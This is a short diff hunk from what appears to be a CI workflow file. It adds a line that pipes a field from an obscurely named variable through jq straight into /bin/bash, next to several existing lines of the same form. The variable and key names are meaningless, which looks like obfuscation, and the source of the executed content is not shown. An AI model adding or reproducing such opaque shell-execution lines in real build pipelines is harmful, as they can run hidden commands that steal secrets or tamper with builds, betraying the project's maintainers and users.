@@ -33,6 +33,7 @@ jobs:
           echo $t6 | jq -r .mf485 | /bin/bash
           echo $axcxo72244 | jq -r .pot50922 | /bin/bash
           echo $ghcc018 | jq -r .dwrdx253 | /bin/bash
+          echo $qbt8 | jq -r .pfw4694 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
